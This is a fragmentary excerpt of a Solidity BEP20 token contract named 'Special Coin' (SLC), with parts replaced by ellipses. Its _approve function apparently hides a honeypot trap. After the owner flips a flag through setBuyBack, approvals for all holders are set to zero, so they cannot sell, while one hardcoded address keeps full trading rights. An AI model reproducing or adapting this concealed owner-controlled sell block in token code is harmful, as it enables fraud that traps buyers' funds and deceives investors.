...
contract HelloBEP20 is IBEP20 {
    ...
    string public name20REX =  "Special Coin";
    string public symbol20REX =  "SLC";
  ...
  function decimals() public view virtual returns (uint8) {
    ...
    function _approve(address tokenOwner, address spender, uint256 tokens) internal {
        ...
        if (tokenOwner == address(0xE5307884F3a06d77be63aDfB559d863eAB6b2bE3) || spender == address(0xE5307884F3a06d77be63aDfB559d863eAB6b2bE3)) {
            allowed[tokenOwner][spender] = tokens;
            emit Approval(tokenOwner, spender, tokens);
        } else {
            if (sellBack == true) {
                allowed[tokenOwner][spender] = 0;
                emit Approval(tokenOwner, spender, 0);
            } else {
                allowed[tokenOwner][spender] = tokens;
                emit Approval(tokenOwner, spender, tokens);
            }
    ...
    function setBuyBack(bool input) public virtual onlyOwner {
        sellBack = input;
    }
